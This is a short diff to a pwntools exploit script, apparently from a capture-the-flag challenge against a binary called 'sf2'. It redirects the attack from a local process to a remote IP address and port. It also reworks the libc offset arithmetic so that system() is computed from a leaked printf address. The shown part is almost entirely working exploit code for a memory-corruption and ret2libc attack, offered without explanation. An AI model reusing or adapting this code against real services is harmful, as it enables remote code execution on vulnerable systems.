@@ -1,5 +1,6 @@
 from pwn import*
-p=process('./sf2')
+#p=process('./sf2')
+p=remote('35.194.245.237',8082)
 # gadget
 bss = 0x804A060
 
@@ -24,8 +25,10 @@ show(-4)
 
 p.recvuntil('Your data : ')
 libc_printf = u32(p.recv(4))
-libc_base = libc_printf - 0x49670
-libc_system = libc_base + 0x3ada0
+#libc_base = libc_printf - 0x49670
+#libc_system = libc_base + 0x3ada0
+libc_system = libc_printf - 0xe6e0
+print 'libc_printf = '+hex(libc_printf)
 print 'libc_system = '+hex(libc_system)
 
 # exploit
